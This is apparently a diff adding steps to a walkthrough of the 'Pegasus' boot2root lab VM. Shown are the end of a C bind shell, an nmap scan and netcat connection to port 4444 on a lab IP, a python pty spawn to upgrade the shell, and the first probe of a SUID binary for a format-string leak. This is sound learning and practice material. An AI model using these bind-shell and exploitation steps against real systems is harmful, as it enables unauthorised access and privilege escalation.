@@ -148,7 +148,7 @@ Page Source:
 </html>
 Looking into the source code we can see that this page finally submits the POST data to submit.php
 
-Now submit a bind shell
+Now submit a bind shell written in C
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -182,3 +182,67 @@ int main(void)
         execve("/bin/sh", NULL, NULL);
         return 0;
 }
+
+Checking if port 4444 is open
+root@kali:~# nmap -sS -p4444 192.168.0.5
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-27 23:23 PDT
+Nmap scan report for 192.168.0.5
+Host is up (0.00019s latency).
+PORT     STATE SERVICE
+4444/tcp open  krb524
+MAC Address: 00:0C:29:57:54:7E (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
+
+4.) Connecting to 4444 using netcat 
+Use python to get a TTY enabled shell
+root@kali:~# nc -nv 192.168.0.5 4444
+(UNKNOWN) [192.168.0.5] 4444 (?) open
+python -c 'import pty;pty.spawn("/bin/bash")'
+mike@pegasus:/home/mike$ id
+id
+uid=1001(mike) gid=1001(mike) groups=1001(mike)
+mike@pegasus:/home/mike$
+
+5.) Looking around we find a binary with SUID bit enabled
+mike@pegasus:/home/mike$ ls -l
+ls -l
+total 16
+drwx------ 2 mike mike 4096 Nov 18  2014 Mail
+-rwxr-xr-x 1 mike mike  845 Nov 18  2014 check_code.sh
+-rwsr-xr-x 1 john john 6606 Nov 28  2014 my_first
+mike@pegasus:/home/mike$ ./my_first
+./my_first
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+Selection: 1
+1
+Enter first number: 5
+5
+Enter second number: AAAA
+AAAA
+Error details: AAAA
+
+Testing for format string vulnerabilities
+mike@pegasus:/home/mike$ ./my_first
+./my_first
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+Selection: 1
+1
+Enter first number: 5
+5
+Enter second number: %x
+%x
+Error details: bf9282ac
